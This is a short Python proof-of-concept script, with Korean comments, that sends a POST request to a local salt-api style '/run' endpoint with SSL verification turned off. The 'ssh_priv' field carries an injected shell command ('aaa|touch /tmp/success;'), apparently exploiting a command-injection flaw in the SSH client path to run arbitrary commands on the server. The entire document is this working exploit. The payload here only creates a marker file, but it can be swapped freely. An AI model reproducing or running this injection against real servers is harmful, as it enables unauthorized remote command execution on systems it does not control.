import requests

url = "https://127.0.0.1:8000/run"

headers = {
    "Host": "127.0.0.1:8000",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Accept": "application/x-yaml",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "DNT": "1",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
}

data = {
    "token": "12312",
    "client": "ssh",
    "tgt": "*",
    "fun": "a",
    "roster": "whip1ash",
    "ssh_priv": "aaa|touch /tmp/success;"
}

# SSL 검증을 비활성화하여 요청을 보냅니다.
response = requests.post(url, headers=headers, data=data, verify=False)

# 서버 응답을 출력합니다.
print(response.text)

